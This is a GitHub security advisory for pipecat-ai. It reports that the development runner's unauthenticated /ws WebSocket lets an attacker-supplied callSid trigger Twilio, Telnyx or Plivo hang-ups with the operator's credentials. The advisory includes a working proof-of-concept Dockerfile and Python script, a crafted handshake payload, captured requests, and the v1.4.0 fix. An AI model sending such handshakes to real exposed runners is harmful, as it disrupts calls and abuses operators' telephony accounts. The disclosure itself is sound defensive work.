# [H] Pipecat: Telephony WebSocket `/ws` Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID

## Summary
Severity: High
Advisory: GHSA-j8cv-x86q-rj85
CVE: CVE-2026-54695
CWE: CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-j8cv-x86q-rj85
Type: github-advisory

## Affected
- PyPI: `pipecat-ai` — affected >=0.0.77 <1.4.0

## Details
## Development Runner Telephony WebSocket `/ws` Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID

### Summary

The pipecat development runner registers a `/ws` WebSocket endpoint for telephony testing that accepts connections without any authentication. An unauthenticated remote attacker who can reach an exposed runner endpoint can connect to this endpoint, send a crafted Twilio handshake message containing an attacker-supplied `callSid`, and cause the server to issue an authenticated Twilio REST API hang-up request against that call SID using the server operator's own credentials. This may allow the attacker to forcibly terminate an active call on the victim's Twilio account if the attacker knows or obtains a valid call SID for that account. Equivalent unauthenticated call-control sinks exist for Telnyx and Plivo. Maintainers are evaluating the final CVSS 3.1 score.

### Details

The pipecat development runner registers a WebSocket route at `/ws` (`src/pipecat/runner/run.py:1116`). When a client connects, the server immediately accepts the connection without performing any authentication or signature verification (`run.py:1119`):

```python
await websocket.accept()   # run.py:1119 — no auth check before this point
```

After acceptance, the server reads the Twilio WebSocket stream-start handshake and extracts the `callSid` field verbatim from the attacker-controlled JSON payload (`src/pipecat/runner/utils.py:223`):

```python
call_id: start_data.get("callSid")   # utils.py:223 — tainted, attacker-supplied
```

The tainted `call_id` is then passed directly into `TwilioFrameSerializer` alongside the server's own Twilio account credentials, which are read from environment variables (`src/pipecat/runner/utils.py:513-517`):

```python
TwilioFrameSerializer(
    stream_sid=stream_id,
    call_sid=call_id,                          # TAINTED
    account_sid=os.getenv("TWILIO_ACCOUNT_SID"),  # server credential
    auth_token=os.getenv("TWILIO_AUTH_TOKEN"),     # server credential
)
```

`TwilioFrameSerializer` has `auto_hang_up` defaulting to `True` (`src/pipecat/serializers/twilio.py:56`). When the pipeline terminates and serializes an `EndFrame` or `CancelFrame`, `_hang_up_call()` is triggered (`twilio.py:141-147`). This method constructs a Twilio REST API URL containing the attacker-supplied `call_sid` and POSTs to it using the server's own credentials (`twilio.py:196`, `twilio.py:206`):

```
POST https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{attacker_call_sid}.json
Authorization: Basic <base64(account_sid:auth_token)>
Body: Status=completed
```

The same unauthenticated call-control pattern exists for Telnyx (`src/pipecat/serializers/telnyx.py:188`, `:195`) and Plivo (`src/pipecat/serializers/plivo.py:180`, `:187`).

Although the runner defaults to `localhost` and is documented as a development runner, its telephony mode is commonly used with a public proxy hostname so that telephony providers can connect inbound calls. If the development runner is exposed to untrusted networks while configured with Twilio, Telnyx, or Plivo credentials, this becomes a realistic network-reachable attack surface.

### PoC

**Prerequisites**

- Docker (for building the isolated PoC image)
- A clone of the pipecat repository at commit `b982b45a7ae1e5ee99e4390ad5a116cdd9b4a8e2` placed at `<context_root>/repo/`
- The files `vuln-001/Dockerfile` and `vuln-001/poc.py` present under `<context_root>/`

**Step 1 — Build the Docker image**

```bash
docker build \
  -f vuln-001/Dockerfile \
  -t vuln001-poc \
  reports/pypiAi_247_pipecat-ai__pipecat
```

The Dockerfile installs pipecat from the local repository clone, generates a self-signed TLS CA and server certificate for `api.twilio.com`, and registers that CA in the system trust store so that pipecat's `aiohttp`-based HTTP client accepts the mock server certificate.

**Step 2 — Run the PoC**

```bash
docker run --rm \
  --add-host api.twilio.com:127.0.0.1 \
  vuln001-poc
```

The `--add-host` flag redirects DNS resolution for `api.twilio.com` to the loopback interface so all outgoing Twilio REST API calls hit the mock server instead of Twilio's real infrastructure.

**What the PoC does**

1. Starts a local TLS-enabled HTTP server on `127.0.0.1:443` that impersonates `api.twilio.com` and records every incoming POST request.
2. Simulates the attacker-controlled WebSocket handshake message with an injected `callSid`:
   ```json
   {"event": "start", "start": {"streamSid": "MX000...", "callSid": "CAATTACKER1337INJECTED00000000001", "customParameters": {}}}
   ```
3. Runs the exact pipecat code path: parses `callSid` from attacker input (`utils.py:223`), constructs `TwilioFrameSerializer` with server credentials (`utils.py:513-517`), and calls `serialize(EndFrame())` which triggers `_hang_up_call()` (`twilio.py:141-147`, `:196`, `:206`).
4. Verifies that the mock server received a POST whose URL contains the attacker-injected call SID.

**Expected output (passing)**

```
[PASS] *** VULNERABILITY CONFIRMED ***
[PASS] Attacker callSid 'CAATTACKER1337INJECTED00000000001' appears in Twilio REST API URL.
[PASS] The server used its own credentials (account_sid=ACFAKE000000000000000000000000001)
[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.
```

**Observed intercepted request (Phase 2 dynamic reproduction)**

```
POST https://api.twilio.com/2010-04-01/Accounts/ACFAKE000000000000000000000000001/Calls/CAATTACKER1337INJECTED00000000001.json
Authorization: Basic QUNGQUtFMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxOmZha2VfYXV0aF90b2tlbl9wb2Nfb25seQ==
Body: Status=completed
```

Decoding the `Authorization` header confirms `ACFAKE000000000000000000000000001:fake_auth_token_poc_only` — the server's own credentials were used against the attacker-specified call SID.

### Impact

This is a Missing Authorization vulnerability (CWE-862) in the development runner's telephony WebSocket handling. An unauthenticated network actor who can reach an exposed `/ws` WebSocket endpoint of a pipecat development runner configured with Twilio, Telnyx, or Plivo credentials may be able to:

1. **Forcibly terminate active calls whose valid call-control identifiers are known or obtained** on the server operator's Twilio, Telnyx, or Plivo account by injecting the victim call identifier into the WebSocket handshake and then triggering pipeline termination.
2. **Cause denial of service** against affected calls by repeatedly terminating calls for which the attacker has valid call-control identifiers.
3. **Abuse the operator's telephony provider credentials** to perform call-control actions that the attacker does not have direct access to, effectively escalating privilege over the operator's telephony account.

Impacted parties include operators who expose the pipecat development runner's telephony `/ws` endpoint on a publicly reachable host with Twilio, Telnyx, or Plivo credentials configured, and their customers whose active calls can be disrupted if a valid call-control identifier is known or obtained by an attacker.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.11-slim

LABEL description="VULN-001 PoC: Telephony WebSocket /ws callSid injection (CWE-862)"

WORKDIR /poc

# Install system tools needed for certificate generation and trust management
RUN apt-get update && apt-get install -y \
    openssl \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Generate a local CA and a server certificate for api.twilio.com.
# We add the CA to the system trust store so that Python's ssl module
# (used by aiohttp inside TwilioFrameSerializer._hang_up_call) accepts
# our mock HTTPS server at 127.0.0.1:443 as if it were real Twilio.
RUN mkdir -p /poc/certs \
    # CA private key
    && openssl genrsa -out /poc/certs/ca.key 2048 \
    # Self-signed CA certificate (1 day is enough for a PoC run)
    && openssl req -new -x509 -days 1 \
       -key /poc/certs/ca.key \
       -out /poc/certs/ca.crt \
       -subj "/CN=Mock Twilio CA/O=VULN001-PoC/C=US" \
    # Server private key
    && openssl genrsa -out /poc/certs/server.key 2048 \
    # Server CSR — CN must match the hostname pipecat connects to
    && openssl req -new \
       -key /poc/certs/server.key \
       -out /poc/certs/server.csr \
       -subj "/CN=api.twilio.com/O=Mock Twilio/C=US" \
    # SAN extension file (required for modern TLS hostname verification)
    && printf "[SAN]\nsubjectAltName=DNS:api.twilio.com\n" > /poc/certs/san.cnf \
    # Sign the server cert with our CA, including the SAN extension
    && openssl x509 -req -days 1 \
       -in /poc/certs/server.csr \
       -CA /poc/certs/ca.crt \
       -CAkey /poc/certs/ca.key \
       -CAcreateserial \
       -out /poc/certs/server.crt \
       -extfile /poc/certs/san.cnf \
       -extensions SAN \
    # Add our CA to the Debian system trust store
    && cp /poc/certs/ca.crt /usr/local/share/ca-certificates/mock_twilio_ca.crt \
    && update-ca-certificates

# Install pipecat from the cloned repository.
# aiohttp is a pipecat base dependency; it is used inside _hang_up_call().
# numpy and soxr are required for pipecat audio utilities imported at module load.
COPY repo /pipecat
RUN pip install --no-cache-dir \
    -e "/pipecat" \
    aiohttp \
    "websockets>=11"

# Fake Twilio server-side credentials (equivalent to what a real deployment reads from env).
# In a real deployment these are valid account credentials; here they just need to be non-empty
# so TwilioFrameSerializer passes its __init__ validation.
ENV TWILIO_ACCOUNT_SID=ACFAKE000000000000000000000000001
ENV TWILIO_AUTH_TOKEN=fake_auth_token_poc_only

COPY vuln-001/poc.py /poc/poc.py

# Run the PoC.  The container must be started with --add-host api.twilio.com:127.0.0.1
# so that DNS for api.twilio.com resolves to the local mock server.
CMD ["python3", "/poc/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: Telephony WebSocket /ws unauthenticated call-control abuse
via attacker-supplied call SID (CWE-862).

Vulnerability summary
---------------------
The pipecat telephony runner registers a /ws WebSocket endpoint that accepts
connections without any authentication (run.py:1119).  When a client connects,
the server parses the Twilio "start" handshake message and extracts the callSid
field verbatim from the attacker-controlled payload (utils.py:223).  That
callSid is then injected into TwilioFrameSerializer together with the server's
own Twilio credentials read from environment variables (utils.py:513-517).
When the pipeline terminates and serializes an EndFrame, _hang_up_call() fires
and issues a Twilio REST API POST with the attacker's callSid in the URL
(twilio.py:196, :206), causing the server to hang up the attacker-specified
call SID if it identifies a valid call in the server's Twilio account.

What this PoC does
------------------
1. Starts a local HTTPS server on 127.0.0.1:443 that impersonates api.twilio.com
   and records every incoming POST request.  The TLS certificate was generated
   in the Docker build stage and the CA was injected into the system trust store,
   so aiohttp accepts it as legitimate.
2. Ensures /etc/hosts resolves api.twilio.com to 127.0.0.1 so that aiohttp's
   DNS lookup reaches the mock server instead of Twilio's real infrastructure.
3. Reproduces the exact vulnerable code path from pipecat:
     - Parses callSid from attacker-controlled input  (utils.py:223)
     - Creates TwilioFrameSerializer(call_sid=<attacker_value>,
                                     account_sid=TWILIO_ACCOUNT_SID,
                                     auth_token=TWILIO_AUTH_TOKEN)
                                                        (utils.py:513-517)
     - Calls serialize(EndFrame()) which internally invokes _hang_up_call()
                                                        (twilio.py:141-147)
     - _hang_up_call() POSTs to https://api.twilio.com/.../Calls/{callSid}.json
       using server-side Basic Auth credentials       (twilio.py:196, :206)
4. Verifies that the mock server received a POST whose URL contains the
   attacker-injected callSid, providing deterministic observable evidence.

Expected pass criterion
-----------------------
The intercepted POST path must contain ATTACKER_CALL_SID.  This proves that
an attacker who connects to /ws and sends a crafted callSid can cause the
pipecat server to issue authenticated Twilio REST API calls against the call
SID supplied by the attacker, using the server operator's credentials.

Requirements
------------
- Run inside the Docker image built from the accompanying Dockerfile.
- Start the container with --add-host api.twilio.com:127.0.0.1, OR run this
  script as root so that /etc/hosts can be written programmatically.
- Port 443 must be available (container runs as root by default).
"""

import asyncio
import json
import os
import ssl
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# The callSid the attacker injects into the Twilio WebSocket handshake.
# In a real attack this would need to be the SID of a victim's active call on
# the server operator's Twilio account.
ATTACKER_CALL_SID = "CAATTACKER1337INJECTED00000000001"

# Fake Twilio account credentials — in a real deployment these are real and
# are read from environment variables by pipecat (os.getenv).
FAKE_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID", "ACFAKE000000000000000000000000001")
FAKE_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN", "fake_auth_token_poc_only")

# Directory where the Docker build stage generated the TLS certificate pair.
CERTS_DIR = Path("/poc/certs")

# The mock Twilio HTTPS server listens here.  Must be 443 because pipecat
# hard-codes the Twilio API base URL to https://api.twilio.com (port 443).
MOCK_SERVER_HOST = "127.0.0.1"
MOCK_SERVER_PORT = 443

# ---------------------------------------------------------------------------
# Mock Twilio REST API server
# ---------------------------------------------------------------------------

# Thread-safe storage for captured requests; set by the handler thread.
_intercepted_requests: list[dict] = []
_request_received = threading.Event()


class MockTwilioAPIHandler(BaseHTTPRequestHandler):
    """
    Minimal HTTP handler that records POST requests.

    pipecat's _hang_up_call() issues exactly one POST request to:
        https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{call_sid}.json
    with Basic Auth (account_sid:auth_token) and body Status=completed.
    This handler captures that request verbatim.
    """

    def do_POST(self) -> None:
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        captured = {
            "method": "POST",
            "path": self.path,
            "authorization": self.headers.get("Authorization", ""),
            "body": body,
        }
        _intercepted_requests.append(captured)
        _request_received.set()

        print()
        print("[MOCK TWILIO] *** Intercepted outgoing Twilio REST API call ***")
        print(f"[MOCK TWILIO] POST https://api.twilio.com{self.path}")
        print(f"[MOCK TWILIO] Authorization: {captured['authorization']}")
        print(f"[MOCK TWILIO] Body: {body}")
        print()

        # Respond with a minimal 200 JSON body that satisfies aiohttp's response parsing.
        response_body = json.dumps({"sid": "CA000000000000000000000000000001",
                                    "status": "completed"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(response_body)))
        self.end_headers()
        self.wfile.write(response_body)

    def log_message(self, fmt: str, *args) -> None:  # type: ignore[override]
        # Suppress the default per-request stderr log line.
        pass


def start_mock_twilio_server() -> HTTPServer:
    """
    Start the mock Twilio HTTPS server in a daemon thread.

    The server uses the TLS certificate generated at Docker build time.
    That certificate is for api.twilio.com and is signed by the mock CA
    that was added to the system trust store via update-ca-certificates,
    so Python's ssl.create_default_context() (used by aiohttp) accepts it.
    """
    cert_file = CERTS_DIR / "server.crt"
    key_file = CERTS_DIR / "server.key"

    if not cert_file.exists() or not key_file.exists():
        print(f"[ERROR] TLS certificates not found in {CERTS_DIR}")
        print("[ERROR] Rebuild the Docker image: the Dockerfile generates them at build time.")
        sys.exit(1)

    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.load_cert_chain(str(cert_file), str(key_file))

    server = HTTPServer((MOCK_SERVER_HOST, MOCK_SERVER_PORT), MockTwilioAPIHandler)
    server.socket = ssl_ctx.wrap_socket(server.socket, server_side=True)

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ---------------------------------------------------------------------------
# /etc/hosts redirect
# ---------------------------------------------------------------------------

def ensure_hosts_redirect() -> None:
    """
    Ensure api.twilio.com resolves to 127.0.0.1 in /etc/hosts.

    Preferred: pass --add-host api.twilio.com:127.0.0.1 to docker run.
    Fallback: write directly (requires root, which is the default in Docker).
    """
    hosts_path = Path("/etc/hosts")
    content = hosts_path.read_text()
    if "api.twilio.com" in content:
        print("[+] /etc/hosts already contains api.twilio.com -> 127.0.0.1")
        return
    try:
        with open(hosts_path, "a") as fh:
            fh.write("\n127.0.0.1 api.twilio.com\n")
        print("[+] Wrote api.twilio.com -> 127.0.0.1 into /etc/hosts")
    except PermissionError:
        print("[WARN] Cannot write /etc/hosts — start container with"
              " --add-host api.twilio.com:127.0.0.1")


# ---------------------------------------------------------------------------
# Core attack reproduction using pipecat's actual code
# ---------------------------------------------------------------------------

async def reproduce_attack() -> None:
    """
    Reproduce the vulnerable pipecat code path step by step.

    This function uses the real pipecat library (installed from the cloned
    repository) and does NOT modify any source files.  The objective is to
    show that pipecat's own code, given attacker-controlled input on /ws,
    will issue an authenticated Twilio REST API call against the injected
    callSid.
    """
    # Import pipecat's actual serializer and frame types.
    from pipecat.serializers.twilio import TwilioFrameSerializer
    from pipecat.frames.frames import EndFrame

    print()
    print("=" * 65)
    print("Step 1 — Attacker-supplied WebSocket handshake (no auth check)")
    print("=" * 65)
    # This is what the attacker sends to /ws after the server calls
    # await websocket.accept()  (run.py:1119 — no prior auth check).
    attacker_ws_message = {
        "event": "start",
        "start": {
            "streamSid": "MX00000000000000000000000000000000",
            "callSid": ATTACKER_CALL_SID,   # <-- attacker-controlled
            "customParameters": {}
        }
    }
    print(f"Attacker sends: {json.dumps(attacker_ws_message)}")

    print()
    print("=" * 65)
    print("Step 2 — pipecat parses callSid from attacker message")
    print("         (mirrors utils.py:218-230)")
    print("=" * 65)
    # Reproduction of utils.py:219-230
    start_data = attacker_ws_message["start"]
    call_id = start_data.get("callSid")      # utils.py:223 — tainted value
    stream_id = start_data.get("streamSid")
    print(f"Parsed call_id (attacker-controlled): {call_id}")
    print(f"Parsed stream_id:                     {stream_id}")

    print()
    print("=" * 65)
    print("Step 3 — TwilioFrameSerializer created with attacker callSid")
    print("         + server-side Twilio credentials (utils.py:513-517)")
    print("=" * 65)
    print(f"  call_sid    = {call_id!r}   [TAINTED: from attacker]")
    print(f"  account_sid = {FAKE_ACCOUNT_SID!r}   [from TWILIO_ACCOUNT_SID env var]")
    print(f"  auth_token  = {FAKE_AUTH_TOKEN[:8]!r}...   [from TWILIO_AUTH_TOKEN env var]")

    # This is the exact code at utils.py:513-517.
    serializer = TwilioFrameSerializer(
        stream_sid=stream_id,
        call_sid=call_id,             # TAINTED — attacker-supplied
        account_sid=FAKE_ACCOUNT_SID, # server credential
        auth_token=FAKE_AUTH_TOKEN,   # server credential
    )

    print()
    print("=" * 65)
    print("Step 4 — Pipeline ends: serialize(EndFrame()) triggers _hang_up_call()")
    print("         (twilio.py:141-147 -> twilio.py:196, :206)")
    print("=" * 65)
    print("Calling serializer.serialize(EndFrame()) ...")
    print(f"Expected Twilio API URL:")
    print(f"  https://api.twilio.com/2010-04-01/Accounts/{FAKE_ACCOUNT_SID}"
          f"/Calls/{call_id}.json")
    print("(api.twilio.com resolves to 127.0.0.1 — intercepted by mock server)")

    # This line reproduces twilio.py:141-147 -> _hang_up_call().
    # aiohttp will POST to api.twilio.com which /etc/hosts redirects to
    # our mock HTTPS server.  The mock server logs the request including
    # the attacker-injected callSid in the URL.
    await serializer.serialize(EndFrame())

    print("serialize(EndFrame()) returned — API POST dispatched.")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

async def main() -> bool:
    print()
    print("=" * 65)
    print("VULN-001 PoC — Telephony WebSocket callSid Injection")
    print("CWE-862: Missing Authorization")
    print("pipecat-ai/pipecat @ commit b982b45")
    print("=" * 65)

    # 1. Redirect api.twilio.com to localhost
    ensure_hosts_redirect()

    # 2. Start the mock Twilio HTTPS server
    print("[*] Starting mock Twilio REST API server on 127.0.0.1:443 ...")
    start_mock_twilio_server()
    time.sleep(0.3)  # Let the server thread bind and start accepting.
    print("[+] Mock server ready.")

    # 3. Reproduce the attack using pipecat's own code
    try:
        await reproduce_attack()
    except Exception as exc:
        print(f"\n[ERROR] Attack reproduction raised an exception: {exc}")
        import traceback
        traceback.print_exc()
        return False

    # 4. Wait for the mock server to record the intercepted request
    print()
    print("[*] Waiting for mock Twilio server to receive POST request (timeout 10 s) ...")
    received = _request_received.wait(timeout=10.0)

    # 5. Evaluate evidence
    print()
    print("=" * 65)
    print("EVIDENCE EVALUATION")
    print("=" * 65)

    if not received or not _intercepted_requests:
        print("[FAIL] Mock Twilio server received no requests within 10 seconds.")
        print("       Likely causes:")
        print("       - api.twilio.com /etc/hosts entry missing or wrong")
        print("       - Port 443 could not be bound (need root)")
        print("       - CA certificate not added to system trust store")
        return False

    req = _intercepted_requests[0]
    path = req["path"]
    auth = req["authorization"]
    body = req["body"]

    print(f"Intercepted POST:")
    print(f"  URL:           https://api.twilio.com{path}")
    print(f"  Authorization: {auth}")
    print(f"  Body:          {body}")

    expected_fragment = f"/Calls/{ATTACKER_CALL_SID}.json"
    if expected_fragment in path:
        print()
        print("[PASS] *** VULNERABILITY CONFIRMED ***")
        print(f"[PASS] Attacker callSid '{ATTACKER_CALL_SID}' appears in Twilio REST API URL.")
        print(f"[PASS] The server used its own credentials (account_sid={FAKE_ACCOUNT_SID})")
        print(f"[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.")
        print(f"[PASS] In a real deployment this terminates the call if the SID identifies an active call")
        print(f"[PASS] in the server operator's Twilio account.")
        return True
    else:
        print()
        print(f"[FAIL] Expected callSid not found in intercepted path: {path}")
        return False


if __name__ == "__main__":
    success = asyncio.run(main())
    sys.exit(0 if success else 1)
```

### Resolution

This issue was addressed in pipecat-ai `v1.4.0` by adding optional HMAC token authentication for development-runner WebSocket endpoints.

Operators who expose the development runner’s WebSocket endpoints to anything other than localhost should upgrade to `v1.4.0` or later and enable WebSocket token authentication:

```bash
PIPECAT_WEBSOCKET_AUTH=token
```

or:

```bash
python bot.py -t twilio --ws-auth token
python bot.py -t websocket --ws-auth token
```

When enabled, clients must first call `POST /start` to obtain a short-lived, one-time-use signed token before connecting to `/ws` or `/ws-client`. Tokens may be supplied via
`Authorization: Bearer <token>`, `?token=<token>`, or as a path segment such as `/ws/<token>`, which is intended for telephony providers that cannot set custom headers. Invalid,
expired, or replayed tokens are rejected with WebSocket close code `4003`.

The fix was merged in https://github.com/pipecat-ai/pipecat/pull/4660.

## References
- https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85
- https://github.com/pipecat-ai/pipecat/pull/4660
- https://github.com/pipecat-ai/pipecat
